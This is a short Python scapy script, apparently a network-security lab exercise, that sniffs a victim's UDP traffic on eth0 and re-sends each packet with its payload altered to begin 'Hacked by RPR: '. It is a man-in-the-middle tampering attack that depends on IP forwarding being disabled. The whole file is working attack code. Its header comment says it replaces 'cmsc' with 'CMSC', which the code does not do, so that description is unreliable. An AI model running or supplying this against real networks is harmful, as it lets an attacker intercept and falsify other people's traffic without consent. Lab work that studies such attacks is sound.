#!/usr/bin/python3
# ensure that output of 'sysctl net.ipv4.ip_forward'  should be zero.
# set this value to zero by following command. NO SPACE before and after '=' sign.
# sysctl -w net.ipv4.ip_forward=0
# --------------------------------
# the program replaces any occurrent of cmsc with CMSC.
# -------------------------------
import sys
import re
from scapy.all import *

if len(sys.argv) != 4:
  print("Usage: sys.argv[0] <vitim IP> <dstn IP> <victim MAC>")
  exit();

def spoof_pkt(pkt):
  iprcv = IP(bytes(pkt[IP]))
  ip = IP(src=iprcv.src, dst=iprcv.dst)
  udp = UDP(sport=iprcv[UDP].sport, dport=iprcv[UDP].dport)
  if pkt[UDP].payload:
    msg = pkt[UDP].payload.load
    hackmsg = "Hacked by RPR: " + msg.decode('ascii')
    pkt = ip/udp/hackmsg
    send(pkt)
    pkt.show()
  else:
      send(pkt)
      pkt.show()

# program has all the 4 params
victim_ip = sys.argv[1]
dstn_ip = sys.argv[2]
victim_mac = sys.argv[3]

template = 'udp and (ip src {A} and ip dst {B} and ether src {C})'
cap_filter = template.format(A=victim_ip, B=dstn_ip, C=victim_mac)
pkt = sniff(iface='eth0', filter=cap_filter, prn=spoof_pkt)

